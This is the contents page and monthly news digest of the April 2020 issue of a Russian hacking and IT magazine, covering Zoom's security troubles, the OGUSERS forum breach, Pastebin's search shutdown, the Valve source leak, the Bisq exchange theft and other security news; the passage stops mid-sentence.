
                                                   Апрель 2020
            № 253
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Со циаль ный монито ринг и советы от Microsoft

    Хак в один клик
  Сравнива ем возможнос ти авто матичес ких сканеров уязвимостей

    AhMyth
  Создаем RAT для Android с помощью прос того конструк тора

    Совсем не Useless Crap
  Ка чаем скилл бинар ной эксплуата ции на сложной задаче с CTF

    Закрепляемся в Active Directory
  Как сохранить дос туп при ата ке на домен

    Windows Setup Automation
  Учим Windows 10 ста вить ся на автопилоте и не задавать вопросов

    Срываем пок ровы
  Черепич ная запись SMR в накопи телях WD и Seagate

    ZetaSDR
  Со бира ем програм мно определя емый радиоприемник своими руками

    МикроБ
  Пишем бейсик на ассем блере и умещаем в 512 байт

    Сте на огня
  Учим ся нас тра ивать файрвол на примере MikroTik

    Неизвестный OpenVPN
  Зна комим ся со скры тыми возможностями и настройками

    BGP route leaks
  Разбира емся с эффектом бабочки в гло бальной сети

    Стань сисадмином!
  Где и как учить ся сетево му администри рова нию

    Обновить необновляемое
   Treble, A/B-разметка, динамичес кие и модульные обновления Android

    Красивое время
  Как я сделал «умные» часы на труб ках Nixie и ESP8266

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ПРОБЛЕМЫ ZOOM
Из‐за повсеместной само изоляции и карантина приложе ние для организации
видеоконферен ций Zoom обрело небыва лую популярность: количество его
пользователей возросло с 10 миллионов человек в декабре 2019 года
до 300 миллионов в апреле 2020 года. Но вместе с огромной популярностью
разработчики Zoom заполучили множество проблем.


Уяз вимости
Все началось с  того, что приложение рас кри тиковали ИБ‐спе циалис ты
и отраслевые СМИ. В час тности, было замечено, что приложение сливало
пользовательскую информацию Facebook, лукавило на счет end‐to‐end‐шиф‐
рования, а также не пояс няло, зачем вооб ще собирает информацию о людях.
  Кроме того, пользователи со общали, что из‐за бага в их списках контактов
оказались сотни незнакомцев, использовавших тот же почтовый домен,
а эксперты обнаруживали, что Windows‐клиент Zoom преобразует UNC‐пути
в ссылки, тогда как Zoom для macOS позволя ет локальному злоумышленнику
или малвари получить в системе root‐пра ва.
  Припомнили Zoom и прошлогоднюю уяз вимость. Тогда при установке
на macOS приложение поднимало на машине пользователя локальный
веб‐сервер с недокументированным API, который оставался в системе даже
после удаления самого приложения и сохранял активность. В результате
любой сайт, который посещал пользователь, мог вза имодействовать с этим
веб‐сервером. Это позволяло делать видеовызовы, подключаться к чужим
звонкам и даже скрыто обновлять или переустанавливать само приложе ние
(без каких‐либо подтверждений со сто роны жертвы). Также веб‐сервер мог
использоваться для DoS‐атак, для чего было достаточно простых пингов.
   Также стоит упомянуть и феномен Zoom‐bombing. С ростом популярности
приложения третьи лица стали все чаще присоединяться к виде оконферен‐
циям Zoom (онлайн‐урокам, деловым встречам и так далее), чтобы сорвать
встречу или пошутить, а затем поделить ся записью пранка в социальных
сетях. Об опасности этого явления предупредило ФБР, и правоохранители
подчеркивали, что Zoom‐bombing незаконен и за него можно понести наказа‐
ние (штраф или даже тюремное заключение).
  Однако предупреждения пранкеров не останавливают. К при меру, на уда‐
ленном занятии в одной из школ Мас сачусетса неопознанный человек при‐
соединился к встрече и демонс трировал татуировки со свастикой на камеру.
В другом случае неизвестные прервали занятие, оскорбляя пре подавате ля.
Американский конгрессмен и вовсе рас ска зал, что в начале апреля злоумыш‐
ленникам удалось сор вать встречу в Zoom, про водившуюся на самых высоких
уровнях правительства США. Письмо об инциденте было направле но пред‐
седателю  комитета  по  надзору  палаты  предста вите лей штата  Огайо.
Документ гласит, что, невзирая на все предупреждения со стороны СМИ
и ФБР, чиновники использовали Zoom для проведения встречи, и в итоге
брифинг прерывался из‐за Zoom‐bombing’а триж ды.


Бойкот
Шквал критики со стороны экспертов и СМИ не мог остаться незамеченным
в крупных компаниях и пра вительственных учреждениях, которые в последнее
время тоже стали активно использовать Zoom.
  В результате от Zoom ста ли официально отка зываться многие крупные
игроки. Так, еще в начале апреля ста ло известно, что Илон Маск запретил
сотрудникам SpaceX использовать Zoom, так как приложение име ет «сущес‐
твенные проблемы с безопас ностью и конфиденциальностью». Вместо этого
было рекомендовано использовать ста рые добрые email и телефоны. Более
того, вскоре и аме риканское космическое агентство НАСА тоже запретило
своим сотрудникам использовать Zoom, руководс твуясь теми же причинами.
   Вслед за НАСА и SpaceX компания Google лишила своих сотрудников дос‐
тупа к Zoom. Теперь компания бло кирует работу при ложения на компьютерах
и смартфонах, предоставляемых сотрудникам, пос кольку безопасность Zoom
не соответствует стандартам Google для приложений.
  Дистанцируются от Zoom и дру гие: например, на Тайване Zoom запретили
использовать правительственным служащим, так как трафик приложения про‐
ходит через серверы в Китае, а стра ны находятся не в лучших отношениях.
Похожий запрет для своих членов выпус тило и австра лийское правительство.
А в школах Нью‐Йорка учителям тоже предложили «пос тепенно отказываться
от Zoom» в пользу других сервисов для про ведения видеоконференций.
  В середине месяца изда ние Financial Times сообщило, что чле нам сената
США и их сотрудникам разослали рекомендации, в которых использование
Zoom не запрещают напрямую, но вмес то это го приложению совету ют
подыскать альтернативу, например Skype for Business. Почти одновременно
с этим немецкая газета Handelsblatt рассказала, что Министерство иностран‐
ных дел Германии тоже уведомило своих сотрудни ков о необходимости прек‐
ратить использование Zoom из сооб ражений безопасности и конфиден‐
циальности.
  Ближе к концу апреля длинный список компаний и учреждений, отказав‐
шихся от Zoom, пополнили и влас ти Индии: в стране запретили исполь‐
зование Zoom для проведения уда лен ных правительственных заседаний,
сообщив, что платформа не подходит для использования государственными
служащими и дол жностными лицами.


Работа над ошиб ками
Восстановить репутацию Zoom после всего случившегося опре деленно будет
непросто, но разработчики не пря чут голову в песок и сейчас посвящают все
свое время повышению безопасности. Так, из‐за жесткой критики со стороны
ИБ‐экспертов в начале апреля разработку приложения вооб ще остановили
на 90 дней, и компания полностью сос редоточилась на этих вопросах, а так‐
же пообещала провести аудит с привлечением сто ронних спе циалистов.



     «Мы раз рабаты вали наш продукт, не пред полагая, что через нес коль-
      ко недель каждый человек в мире вдруг ста нет работать, учиться
      и общаться из дома», — писал гла ва Zoom Эрик Юань, извиняясь
      за все обна руженные в приложе нии проблемы.

К середине месяца в компании сформировали совет CISO, а также создали
консультативный  совет  для  сотрудни чес тва  и обме на идеями о  том,
как решать текущие проб лемы безопас ности и конфиденциальности Zoom.
В него вош ли CISO от VMware, Netﬂix, Uber, Electronic Arts и дру гих крупных
компаний.
  Кроме того, Zoom привлекла в качес тве консультанта Алекса Стамоса,
бывшего главу безопасности Facebook, который поможет в проведении ком‐
плексного анализа безопас ности платформы.
   Стамос уже объявил о планах перейти с нынеш ней раскри тикованной схе‐
мы шифрования на более проверенное и надежное решение. Так, Zoom
заменит текущее шиф рование 256‐AES ECB более безопасным 256‐AES
GCM, и Стамос сооб щает, что в долгосрочной перспективе планируется соз‐
дать принципиально новый крип тографический дизайн, который значительно
снизит риски для Zoom‐систем в целом.
   Также партнером Zoom стала компания Luta  Security, специализиру‐
ющаяся на управле нии программами рас кры тия уязвимостей и организации
bug bounty. Компанию воз главляет ветеран кибербезопасности Кэти Мус‐
сурис (Katie Moussouris). Основательница Luta Security наиболее известна
тем, что координирует bug bounty прог раммы для Microsoft, Symantec и Пен‐
тагона. И хотя у Zoom ранее уже была программа воз награждения за уяз‐
вимости на платформе HackerOne, Luta Security поможет обновить ее и улуч‐
шить.
  В своем Twitter Муссурис намекнула, что в ближай шее время к Zoom при‐
соединятся и другие известные эксперты, в том числе спе циалистка по воп‐
росам конфиденциальности Лея Кисснер (Lea Kissner) — бывшая глава Priva‐
cy Technology в Google, крип тограф и профес сор университета Джонса Хоп‐
кинса Мэттью Грин (Matthew Green), а также три извес тные аудиторские фир‐
мы: Bishop Fox, NCC Group и Trail of Bits.
  Но одной лишь организационной деятельностью дело не ограничивается.
Разработчики Zoom уже устра нили ряд обна руженных экспертами недоче тов.
В частности, они извинились за путаницу вокруг E2E‐шиф рования, убрали
из Zoom жутковатую функцию, поз волявшую отслеживать внимание поль‐
зователей, а также избавились от кода, который сливал данные LinkedIn
и Facebook.
  Еще один немаловаж ный апдейт: для улучшения конфиденциальности
из интерфейса Zoom наконец‐то убрали ID собраний, который раньше отоб‐
ражал ся прямо в заголовке приложения. Проблема заключалась в том, что
многие компании и пользователи обна родовали эти ID и даже пароли случай‐
но, публикуя скриншоты своих собраний в социальных сетях. К примеру,
премьер‐министр Великоб ритании Борис Джонсон поделился ID заседания
кабинета министров Великоб ритании, а члены парламента Бельгии случайно
раскрыли идентификатор и пароль, опуб ликовав скриншот собрания комите‐
та обороны. Подоб ные утечки идентификаторов как раз активно используют‐
ся троллями и пранкерами, которые практикуют Zoom‐bombing.
   Также в приложе нии организа торам соб раний стало значительно проще
управлять настрой ками безопасности. Теперь для этого есть специальный
значок на панели управления и организа тор соб рания может управлять всеми
настройками безопасности из одно го места, боль ше не нужно перемещаться
по разным экранам.
   Стоит сказать, что теперь Zoom проводит еженедельные вебинары «Спро‐
сите Эрика», в рамках которых глава компании Эрик Юань рассказывает
об успехах компании и будущих функциях безопасности Zoom. Именно таким
способом Юань сооб щил о том, что пользователи сами смогут выбирать,
какие центры обработки данных использует Zoom (напомню: властям Тай ваня
не понравилось, что трафик проходит через серверы в Китае), где будут хра‐
ниться их данные, а также в приложении появится возможность сооб щать
о нарушителях.


Утеч ки дан ных
К сожалению, не обошлось и без утечек данных. Сначала специалис ты ком‐
пании IntSights обнаружили в продаже дамп, в который входят учетные данные
пользователей Zoom (email, пароли), а также идентификаторы собраний, име‐
на и клю чи хостов. Тогда речь шла о сравнитель но маленькой БД, содер‐
жащей лишь около 2300 записей.
   Вскоре после этого эксперты компании Cyble сооб щили, что на хакерских
форумах и в даркнете мож но найти примерно 500 тысяч учетных записей
Zoom, которые порой раздают вообще бес платно (таким образом злоумыш‐
ленники пытаются завоевать себе репута цию в хакерском сообщес тве).
  Иссле дователи объяснили,  что  найденные ими  учетные  данные —
это результат атаки типа credential stuﬃng. Таким термином обозначают ситу‐
ации, когда имена пользователей и пароли похищаются с одних сайтов,
а затем используются против других. То есть злоумышленники имеют уже
готовую базу учетных данных (приобретенную в даркнете, собранную самос‐
тоятельно и так далее) и пытаются использовать эти данные, чтобы авторизо‐
ваться на каких‐либо сайтах и сервисах под видом своих жертв.
  Специалисты напомнили, что повторное исполь зование одних и тех же
паролей — это скверная идея, и рекомендуют поль зовате лям, которые прак‐
тикуют подобное, не рисковать и сменить пароли как можно скорее.


0day
Также стоит упомянуть интересную информацию, опубликованную изданием
Vice Motherboard. Журналисты пишут, что в нас тоящее время на рынке сущес‐
твуют два экспло ита для уязвимос тей нулево го дня в Zoom, которые позволя‐
ют атакующим взламывать пользователей и следить за их звонками. Один
эксплоит предназначен для Windows, один для macOS.
  Об эксплоитах изданию рассказали три собственных источника. При этом
отмечалось, что сами источники не видели кода экс плоитов, но с ними свя‐
зывались брокеры уязвимос тей и предлагали данный «товар» для продажи.



      «Нас колько я знаю, сейчас для Zoom есть две уяз вимос ти нулевого
       дня. <…> Одна из них влияет на OS X, а дру гая на Windows, — рас ска-
      зал изда нию Адриэл Десотелс (Adriel Desautels), основатель ком пании
       Netragard, которая раньше тоже занима лась продажей уяз вимос тей. —
     Я не думаю, что у них будет долгий „срок жиз ни“, потому что, ког-
      да 0day начина ют экс плу атировать, он обна руживается».

Два других независимых источника, которые предпочли остаться аноним‐
ными, тоже подтвердили существование двух эксплоитов на рынке. Один
из них говорит, что экс пло ит для Windows — это чистая RCE‐уяз вимость, то
есть проблема, допускающая уда ленное выполнение произвольного кода,
которая идеально подходит для промышленного шпионажа. При этом экспло‐
ит для macOS не является RCE, согласно информации тех же источников.
  По словам одного из источников, который занимается приобретением
эксплоитов, но решил не покупать конкретно этот, в настоящее вре мя за экс‐
плоит для Windows просят 500 тысяч долларов. Анонимный эксперт считает,
что реальная цена экспло ита составляет едва ли половину от этой суммы, так
как у использования данной уяз вимос ти есть немаловажный нюанс: нужно,
чтобы хакер участвовал в звонке вместе целью. То есть для спецслужб,
которые предпочитают тайное наб людение, эта уяз вимость, вероятнее все го,
будет практически бесполезна.



     «Zoom очень серьезно относится к безопас ности пользовате лей. Пос-
      ле того как мы узна ли об этих слу хах, мы работа ли с авторитетной
      ком панией, лидиру ющей в отрасли, чтобы рас сле довать эти сооб-
      щения. На сегод няшний день мы не наш ли каких‑либо под твержде ний
      этим заяв лениям», — сообщили Vice Motherboard предста вите ли Zoom.


7,59 РЫНКА ПРИНАДЛЕЖИТ EDGE


По данным NetMarketShare, теперь браузе ром Microsoft Edge пользуется больше людей, чем
браузером Mozilla Firefox. Это делает Edge вторым по популярности браузером для дес кто пов
в мире. Хотя Google Chrome по‐прежнему лидирует с огромным отрывом и в настоящее вре мя
занимает 68,5% рынка.

В этом месяце Edge впервые превзошел Firefox по популярности и доле рынка. Так, еще год
назад, весной 2019 года, Mozilla Firefox держался на уровне 9,27%, однако в течение года бра‐
узер постепенно терял позиции, и в итоге к марту 2020 года ему принадлежало лишь 7,19%
рынка.

В свою очередь, Microsoft Edge год назад имел рыночную долю 5,20%, но за прошедшее вре‐
мя поднялся до отметки в 7,59%, то есть теперь опе режает Firefox на 0,40%.





КТО ХАКНУЛ OGU?
Эксперты сервиса мониторинга утечек данных Under the Breach обратили
внимание, что один из популярнейших хакерских форумов в интернете —
OGUSERS (он же OGU) сообщил о компромета ции уже второй раз за пос‐
ледний год.


      «Похоже, что кто‑то сумел взломать сер вер через шелл в загрузке
      ава таров в форум ном соф те и получил дос туп к нашей текущей базе
      данных, датиру емой 2 апре ля 2020 года», — писал один из админис-
      тра торов OGUSERS.

В итоге неизвестный злоумышленник похитил данные 200 тысяч пользовате‐
лей, если верить официальной статистике, указанной на самом форуме.
В настоящее время OGUSERS отключен и переведен в режим обслуживания.
  Перед временным закрытием сайта админис тра торы уведомили поль‐
зователей, что сбрасыва ют пароли, а также призвали всех включить двух‐
факторную аутентификацию для учетных записей, чтобы похищенные в ходе
атаки данные нельзя было использовать для взлома аккаунтов.
  Напомню, что прошлый взлом OGUSERS произошел в мае 2019 года. Тог‐
да атакующие проник ли на сервер через уязвимость в одном из кас томных
плагинов и получили дос туп к бэкапу, датированному 26 декаб ря 2018 года.
  Журналисты Vice Motherboard, изу чившие копию украденной БД, сооб‐
щили, что она подлинная. Утечку исследовал и известный ИБ‐журналист
Брайан Кребс (Brian Krebs), который тоже подтвердил подлинность данных
и отметил, что дамп содержал информа цию о 113 тысячах пользовате лей
OGU. Украденная у OGU база данных потом распространялась на других
хакерских форумах.
  Похищенная в этом году БД уже тоже была опубликована на конкуриру‐
ющих хак‐форумах.





КОМАНДА TOR УМЕНЬШАЕТСЯ
Разработчики Tor Project объявили, что 13 из 35 разработчиков проекта в ско ром вре мени
будут уволены. Виной этому непростая финансовая ситуация, в которой международная коман‐
да оказалась из‐за пандемии коронавируса. Изабела Багеруш (Isabela Bagueros), исполнитель‐
ный директор Tor Project, уверила, что разработка проектов про должится и команда, несмотря
на сокращения, сможет поддерживать работу серверов и заниматься развитием ПО (в том чис‐
ле Tor и Tor Browser Bundle).





→«Tor, как и большая часть мира, оказался вовлечен в кризис COVID‐19. Кризис сильно уда‐
рил по нам, как и по многим другим некоммерчес ким организациям и предприятиям малого
бизнеса, и нам пришлось  принять  ряд  труд ных  решений. Мы вынуждены  расстаться
с 13 замечательными людьми, которые помогли сделать Tor доступным для миллионов людей
по всему миру.
  Мы будем двигаться дальше с основной коман дой, сос тоящей из 22 человек»
— Изабела Багеруш, исполнительный директор Tor Project





PASTEBIN СЛОМАЛ
СВОЙ ПОИСК
Издание Vice Motherboard обра тило внимание, что ИБ‐специалисты расстро‐
ены из‐за решения разработ чиков одного из самых популярных paste‐сайтов,
Pastebin. Дело в том, что исследователи пос тоянно мониторят данный ресурс,
так как он давно стал хранилищем для различной сомнительной информации,
в том числе ворованных личных данных, утекших паролей, манифестов хакер‐
ских групп и даже малвари.
  Однако теперь исследова тели начали жаловать ся в социальных сетях
на то, что им не удается вос пользовать ся поиском по Pastebin или заняться
скрапингом при помощи специального API, за доступ к которому они некогда
заплатили деньги (пожизненная подписка стоила 50 долларов).



     «Многие люди и ком пании по раз ным причинам сле дили за Pastebin,
       так как он слу жит источником самой раз ной информа ции: от малвари
      до уте чек данных. Вне зап но отклю чить всех [от поис ка], никак не пре-
      дуп редив и не пре дос тавив даже короткий период перед зак рыти-
      ем, — это очень плохое решение со стороны Pastebin, — говорит Оли-
      вер Хаф, ИБ‑иссле дова тель, который регуляр но использовал Pastebin
      в пов седнев ной работе. — Учитывая, что они не слиш ком хорошо
     модерируют собс твенный контент, а теперь лишились бес платной
      модера ции контента через кра удсорсинг, я могу лишь пред полагать,
      что злоумыш ленники ста нут чаще использовать Pastebin в своих кам-
      паниях, а воз можнос ти действовать на опе реже ние, обна руживая вре-
      донос ные полез ные нагрузки и скрип ты, прежде чем те будут исполь-
      зованы, больше нет».

После возмущения специалистов в Twitter и на дру гих платформах предста‐
вители компании ответили, что дос туп к Scraping API был прекращен «из‐за
активного злоупотребления третьими лицами в коммерчес ких целях, а такая
деятельность запрещена текущими правилами».
   Как выяснили журналис ты, Pastebin изменил свои условия предоставле ния
услуг еще 11 апреля 2020 года. Так, ранее правила гласили:



      «Иссле дова тели име ют пра во скра пить обще дос тупную неп риватную
     информа цию на Pastebin для иссле дова тельских целей и при условии,
      что любые материалы, основанные на этих данных, будут опубликова-
     ны  в  откры том дос тупе. Архивариусы  могут  скра пить  публичную
     информа цию на Pastebin в архивных целях. Вы не можете скра пить
       Pastebin с целью рас сылки спа ма, а так же в целях продажи лич ной
     информа ции пользовате лей Pastebin, в том чис ле рек рутерам, спе-
      циалис там по под бору пер сонала и пор талам по тру доус тройству».

Увы, в новой вер сии документа упоминаний скра пинга нет вообще. Предста‐
вители Vice Motherboard обра тились за разъяснениями к представителям
компании и получили следующий ответ:



     «Мы продолжаем пре дос тавлять обновле ния для нашего сообщес тва
      и улуч шать код нашей платформы. Как вы зна ете, Pastebin был соз дан
      более девятнадца ти лет назад, для раз работчиков раз работчиками,
      но по мере рос та мы меняемся, как и дру гие платформы. А так же
      учим ся у них.
    Мы  всегда рады ИБ‑иссле дова телям и их сообщениям о любых
      наруше ниях наших условий ока зания услуг. Нашей основной ауди-
      торией всегда были раз работчики, инже неры и авторы. Мы продол-
     жим обновляться, пред лагая совер шенно новые функции и изме нения
      на нашей платформе, а так же в социальных сетях».

В результате теперь ИБ‐специалис ты мрачно шутят о том, что Pastebin окон‐
чательно надоел нелегальный и противоправный контент, но бороться с ним
разработчики решили весь ма радикально, через отключение поис ка. Ведь
если никто не находит нарушения, мож но сделать вид, что их нет.


МАЛВАРЬ И COVID‐19

Эксперты Group‐IB выяснили, какая малварь чаще всего эксплу атирует тему COVID‐19 в своих
фишинговых рассылках. В период с 13 фев раля по 1 апреля 2020 года специалисты про ана‐
лизировали сотни фишинговых писем, замас кированных под информационные и коммерческие
рассылки о COVID‐19.

Почти 65% вредоносных рассылок несли «на борту» шпионское ПО (spyware).

Наиболее популярными оказались программы‐шпионы — 65%, второе мес то занимают бэк‐
доры — 31%, на шифровальщики приходится около 4%.

Наиболее востребованными  у кибер преступников ока зались тро яны AgentTesla  (45%),
NetWire (30%) и LokiBot (8%).





Фейковые письма были написаны как на русском, так и на англий ском языках от име ни
авторитетных международ ных организаций, связанных со здравоохранени ем (ВОЗ, ЮНИ СЕФ),
а также крупных российских и международ ных ком паний.


В целом процент фишинговых писем, паразитирующих на теме COVID‐19, невысок и сос тавил
порядка 5% от всего вредоносного трафика.





СЛИВ ИСХОДНИКОВ
TF2 И CS:GO
В конце месяца на 4chan были опубликова ны исходные коды сразу двух игр
компании Valve — CS:GO и Team Fortress 2, и отту да они моментально рас‐
пространились по всему интернету (Twitter, Reddit, торрент‐тре керы, игровые
форумы).


                                     Продолжение статьи →
← Начало статьи





  В игровом сообществе из‐за этого поднялась нешуточная паника,  так
   как пользовате ли немедленно предрекли появление RCE‐эксплоитов и мно‐
  жества читеров. Дошло до того, что на игровых форумах, в социальных сетях
  и на Reddit стали появлять ся призывы ни в коем случае не запус кать
  TF2 и CS:GO, так как яко бы RCE‐эксплоит уже существу ет и даже прос тое
  подклю чение  к игровому серверу может полностью скомпрометировать
  компьютер игрока.
    Интересно,  что  никаких  подтвержденных  данных  о  существовании
   каких‐либо эксплоитов до сих пор нет. Про «RCE‐эксплоит», о котором пре‐
  дупреждали друг друга игроки, ничего не знают ни отраслевые СМИ,
  ни ИБ‐спе циалисты. Компания Valve, в свою очередь, уверяет, что никакой
   угрозы нет. Так, вице‐президент Valve по маркетингу Даг Ломбарди (Doug
   Lombardi) прокомментировал ситуацию:



       «Мы не обна ружили никаких причин для  того, чтобы игроки вол-
         новались или избе гали текущих билдов [наших игр]. Для мак сималь-
        ной безопас ности мы, как обыч но, рекомендуем играть на официаль-
        ных сер верах».

   Valve заверила, что расследует случившееся, и просит сообщес тво поделить‐
  ся информацией о том, кто может стоять за этой утечкой. Также в компании
  рассказали журналистам, что утекшие исходные коды были датированы кон‐
  цом 2017 года. Valve сама предоставляла их доверенным разработчикам игр
  и модов. Более того, Ломбарди говорит, что впервые эти исходники утекли
   в Сеть еще в 2018 году и Valve было извес тно об этом, прос то та пер‐
  воначальная утечка оста лась практичес ки никем не замеченной.
    Но сообщество уже начало искать винова тых самос тоятельно и пос‐
  пешило возложить ответс твенность за инци дент на автора блога ValveNews‐
  Network и известного инсайдера Тайлера Маквикера. Дело в том, что накану‐
  не утечки тот сооб щал, что скоро опубликует матери ал о развитии Team
   Fortress 2.
    В итоге Маквикер был вынужден оправдывать ся. Он провел в Twitch стрим,
  посвященный произошедшей утечке, а также повторил в социальных сетях,
   что ему известно, кто имен но слил исходные коды, о чем он намерен уве‐
  домить юридический отдел Valve.
     Стоит сказать, что панические нас троения игроков все же нельзя назвать
  совсем необоснованными. Дело в том, что утечки исходных кодов действи‐
   тельно существенно облегчают «работу» злоумышленникам и читерам. Хотя
   в настоящее время никаких экспло итов, похоже, не существует, они могут
  появиться в ближайшие недели или месяцы.
    Проблема в том, что подобные прецеденты уже имели место. К примеру,
   в прошлом году эксперты Dr.Web рас ска зывали, как хакеры эксплуатируют
   уязвимости клиента Counter‐Strike 1.6. По данным аналитиков, тогда из офи‐
  циального  клиента Steam было доступно порядка 5000 серверов CS
   1.6 и 1951 из них был соз дан трояном Belonard (то есть 39% всех игровых
  серверов). Подключение к таким серверам дей ствительно было опасно
  и заканчивалось заражением Belonard.
    Остается надеяться, что раз работчики Valve тоже понимают, насколько
  опасными могут быть последствия утечки исходных кодов, и соответству‐
  ющим обра зом обновят (или уже обновили) обе пострадавшие игры, ведь,
  несмотря на возраст, они по‐прежнему пользуются большой популярностью
   у игроков и активно поддерживаются.


  15 DDOS‐СЕРВИСОВ ЛИКВИДИРОВАНЫ

   Власти Нидерландов закрыли сразу 15 сер висов для осуществле ния DDoS‐атак по найму.
  В масштабной операции приняли учас тие представители веб‐хостинговых компаний, регистра‐
   торы доменов, сотрудники Европола, Интерпола и ФБР. Названия зак рытых сервисов пока
   не сообщают.


  Одновременно с этим в Нидерландах был арестован 19‐летний подозреваемый, устраивавший
   DDoS‐атаки на правительствен ные сайты. Так, по его вине 2 гол ландских правительственных
   ресурса не работали на протяжении несколь ких часов 19 марта 2020 года.





 ВЗЛОМ BISQ
  Криптовалютная биржа Bisq приостанови ла торговлю из‐за взлома, который
  привел к краже криптовалюты на сумму 250 тысяч дол ларов США.
   О  приостановке  работы  децентрализованный  обменник  сообщил
   в середине апреля. Пока Bisq не работа ла, разработ чики планировали уста‐
  новить исправление,  устра няющее некую  критическую  уязвимость.  Так
   как Bisq — это peer‐to‐peer‐решение, пользователи могли бы проигнориро‐
   вать это сообщение, но раз работчики крайне не рекомендовали так пос‐
   тупать и объясняли, что эти меры принимаются ради безопасности самих
  пользователей.
    По информации портала CoinDesk, проблема у Bisq воз никла после
  недавнего обновле ния, которое должно было повысить стабильность. Однако
   это же обновление содержало уяз вимость, бла годаря которой киберпрес‐
   тупники  получили  возможность  манипулировать  резервными  адресами
  и обходить временные ограничения, что в итоге позволило направить средс‐
   тва на кошельки, подконтрольные атакующим.
     Из официального заявления Bisq следует, что с помощью этой тактики
   у семи жертв были похищены по мень шей мере 3 Bitcoin и 4000 Monero.
  Таким образом, суммарный ущерб от ата ки составил примерно 250 тысяч
  долларов США.
    В настоящее время уязвимость устранена, и Bisq уже возобновила работу.
  И хотя внедрение патча, похоже, помогло решить проб лему безопас ности,
  оно также вызвало волнения в рядах трейдеров. Так, многие пользователи
  сообщали о провалах сделок и исчезновении средств после обновления
  до версии  1.3.1, содержащей  патч. В ответ на это разработчики Bisq
  рекомендовали проверять информа цию о сделках в разделе Open trades
   в профилях пользователей и при необходимос ти сообщать о проблемах
  с заблокированными средствами.


 ПИРАТСТВО НА ПОДЪЕМЕ
   Сотни миллионов людей остаются дома из‐за пан демии коронавируса, и по всему миру наб‐
   людаются изменения в характере интернет‐трафика. Так, часть населения сейчас работает
   из дома, тогда как другие люди проводят время в Сети в поис ках новос тей и развлечений.
   Из‐за этого, например, значительно возрос трафик легальных потоковых сервисов. Но жур‐
   налисты издания Torrent Freak заметили, что одним лишь легальным контентом пользовате ли
   не ограничиваются.


   За период с декабря 2019 по конец февраля 2020 года количество китайских посетителей
   на пиратских сайтах существенно увеличилось. Резкий прирост посеще ний пиратских сайтов
   начался 24 января, достигнув своего пика 27 января. Пос ле этого трафик немного снизил ся,
   но в конце февраля он все еще был пример но на 20% больше, чем до эпидемии.





   Загрузки торрентов в период с 6 марта по 6 апреля 2020 года тоже возросли. Если раньше
   наблюдалось порядка 12 000 000 ежедневных заг рузок, то теперь их количес тво уве личилось
   до 16 000 000, то есть на 33%.





   Всплеск активности заметен и на уровне тор рент‐трекеров. К примеру, оператор трекера Open‐
    Trackr.org сообщил изданию, что наблюдает уве личение общего чис ла соединений, а также
   количества подключенных пиров. В период с 31 марта по 6 апре ля ежедневное пиковое
   количество пиров увеличилось с 24 000 000 до 26 000 000.





 CLOUDFLARE
 БЕЗ RECAPTCHA
  Компания Cloudﬂare сообщила, что намеревается перейти на использование
  альтернативного сервиса для обнаружения ботов hCaptcha, разрабаты‐
  ваемого калифорнийской компанией Intuition Machines, Inc.
    Сооснователь и исполнитель ный директор  Cloudﬂare Мэттью Принс
   (Matthew Prince) объясняет, что на этот шаг компанию заставили пойти планы
   Google. Дело в том, что в ближайшем будущем ИТ‐гигант собирается начать
  взимать плату за использование reCAPTCHA. Для Cloudﬂare это будет озна‐
   чать дополнительные рас ходы в раз мере нескольких миллионов дол ларов
   в год. И эти расходы компании пришлось бы брать на себя, чтобы не воз‐
   лагать на клиентов.
    Сейчас Cloudﬂare использует Google reCAPTCHA в своих продуктах IP Fire‐
   wall и Gatebot. То есть reCAPTCHA применя ется в том случае, если защищен‐
  ный Cloudﬂare сайт подверга ется DDoS‐ или другой автоматизированной ата‐
   ке. В такой ситуации пользователям предлага ют заполнить форму reCAPTCHA
  перед доступом на сайт.
     Также Cloudﬂare исполь зует reCAPTCHA для работы функции Security Lev‐
   els, позволяя администра торам сайтов включать reCAPTCHA для всех вхо‐
  дящих пользователей. Таким образом админис тратор получает прос тейший
  инструмент для фильтрации трафика и ограничения скорости, вне зависи‐
  мости от того, находится сайт под атакой или же нет.
     Теперь представители Cloudﬂare пишут, что Google, конечно же, имеет
  полное право брать день ги за reCAPTCHA, но Cloudﬂare будет вынуждена
  перейти на использование дру гого сервиса.
    Обычно  Intuition Machines, разрабатывающая hCaptcha, зарабатывает
  деньги, предоставляя дос туп к hCaptcha компани ям, которые хотят провести
  эксперимент в области клас сификации изоб ражений, а также платит владель‐
  цам сайтов за размещение hCaptcha.
    В случае Cloudﬂare все будет наоборот: это Cloudﬂare будет платить
  калифорнийской компании. По сло вам Прин са, это гарантирует, что у Intuition
  Machines будут ресурсы для масштабиро вания инфраструктуры, которая
  удовлетворит требования Cloudﬂare. Разумеется, оплата услуг hCaptcha тоже
  означает дополнительные расходы для компании, но глава Cloudﬂare пояс‐
   няет, что эти расходы лишь кру пица по сравнению с возможными затратами
  на reCAPTCHA.
     Кроме  того, исполь зование hCaptcha решит две дру гие проблемы,
  с которыми Cloudﬂare приходилось сталкивать ся при использовании  re‐
  CAPTCHA. Во‐пер вых, reCAPTCHA порой блокиру ется в Китае, а значит,
   Cloudﬂare не может использовать продукт Google для китайских сайтов
  и пользователей. Во‐вторых, Cloudﬂare давно тревожит политика Google
  по сбору конфиденциальных данных. Принс пишет, что теперь Cloudﬂare
  больше не придется беспокоиться об этом, пос кольку hCaptcha собирает
  гораздо меньше данных о пользователях, заполняющих формы.


  РАЗБЛОКИРОВКА TELEGRAM
   Депутаты Госдумы от «Справедливой Рос сии» под готовили законопроект о прекращении бло‐
   кировок Telegram. Идея возникла из‐за того, что сейчас Telegram, по сути, оказал ся «офи циаль‐
   ным сервисом» госорганов, через который они распространяют информацию о коронавиру се.
   Законопроект уже нап равили премьер‐министру Михаилу Мишус тину, а также в Минкомсвязи.





  →«В большинстве случаев Telegram работает у рос сийских пользователей без каких‐либо
   помех, а в случае их наличия в стране сформировано широкое предложение бесплатных
   средств обхода блокировок. Дальнейшая декларативная блокировка мессен джера, таким обра‐
   зом, наносит урон не его развитию, а престижу государственной влас ти РФ»
  — Федот Тумусов и Дмитрий Ионин, авторы законопроекта





 АТАКИ НА ЮЗЕРОВ
 NINTENDO
  В середине апре ля пользователи Nintendo ста ли массово жаловаться на ком‐
  прометацию учетных записей. Неизвестные лица входили в чужие аккаунты
  из самых разных стран мира, и многие пострадавшие теряли деньги в резуль‐
   тате таких инцидентов. В некоторых случаях хакеры покупали игры Nintendo
